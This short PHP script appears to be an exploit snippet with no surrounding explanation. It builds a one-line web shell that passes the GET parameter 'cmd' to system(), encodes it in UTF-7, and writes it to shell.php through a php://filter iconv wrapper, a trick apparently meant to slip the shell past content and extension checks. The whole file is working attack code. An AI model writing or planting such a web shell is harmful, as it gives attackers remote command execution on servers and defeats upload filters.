<?php

    /* echo highlight_string("<?=system(\$_GET[\"cmd\"])?>", true) */

    $webshell = "<?=system(\$_GET[\"cmd\"])?>";

    $toutf7 = iconv("utf-8", "utf-7", $webshell);

    // echo $toutf7;
    // echo "\n\n";
    // echo highlight_string($toutf7, true);

    $oneliner = $toutf7;
    $out = "php://filter//read=convert.iconv.utf7.utf8/resource=shell.php";

    echo pathinfo($out)['extension'];
    file_put_contents($out, $oneliner);
?>